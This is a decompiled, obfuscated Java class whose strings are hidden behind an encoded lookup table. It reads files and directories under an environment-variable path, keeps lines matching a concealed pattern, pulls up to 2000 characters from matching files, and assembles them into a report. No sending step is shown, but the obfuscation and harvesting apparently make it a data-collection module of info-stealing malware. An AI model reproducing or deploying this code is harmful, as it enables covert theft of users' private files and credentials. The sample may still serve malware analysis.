/*
 * Decompiled with CFR 0.152.
 */
package x;

import java.io.File;
import java.nio.file.Files;
import java.util.regex.Pattern;

public final class s {
    public static a a() {
        String[] stringArray;
        CharSequence charSequence;
        a a2 = new a();
        Object object3 = System.getenv($S.d(211));
        if (object3 == null) {
            object3 = "";
        }
        StringBuilder stringBuilder = new StringBuilder($S.d(447));
        Object object4 = new String[]{(String)object3 + $S.d(448), (String)object3 + $S.d(449)};
        Pattern pattern = Pattern.compile($S.d(450));
        int cfr_ignored_0 = ((String[])object4).length;
        for (int i2 = 0; i2 < 2; ++i2) {
            String string = object4[i2];
            File file = new File(string);
            if (!file.exists()) continue;
            try {
                String string2 = new String(Files.readAllBytes(file.toPath()), $S.d(399));
                charSequence = new StringBuilder();
                for (String string3 : string2.split("\n")) {
                    if (!pattern.matcher(string3).matches()) continue;
                    charSequence.append(string3.trim()).append("\n");
                }
                if (charSequence.length() <= 0) continue;
                stringBuilder.append("[").append(file.getName()).append("]\n").append(charSequence).append("\n");
                a2.a = true;
                continue;
            }
            catch (Exception exception) {}
        }
        object4 = new File((String)object3 + $S.d(451));
        if (((File)object4).exists()) {
            stringBuilder.append($S.d(452)).append(((File)object4).getAbsolutePath()).append("]\n");
            a2.a = true;
        }
        if (((File)(object3 = new File((String)object3 + $S.d(453)))).exists() && (stringArray = ((File)object3).list()) != null) {
            String[] stringArray2 = stringArray;
            int n2 = stringArray.length;
            for (int i2 = 0; i2 < n2; ++i2) {
                charSequence = stringArray2[i2];
                String string = ((String)charSequence).toLowerCase();
                if (!string.endsWith($S.d(446)) || !string.contains($S.d(445))) continue;
                try {
                    File file = new File((File)object3, (String)charSequence);
                    String string4 = new String(Files.readAllBytes(file.toPath()), $S.d(399));
                    if (string4.length() > 2000) {
                        string4 = string4.substring(0, 2000);
                    }
                    stringBuilder.append("[").append((String)charSequence).append("]\n").append(string4).append("\n\n");
                    a2.a = true;
                    continue;
                }
                catch (Exception exception) {}
            }
        }
        if (!a2.a) {
            stringBuilder.append($S.d(454));
        }
        a2.b = stringBuilder.toString();
        return a2;
    }

    public static final class a {
        public boolean a;
        public String b;
    }
}

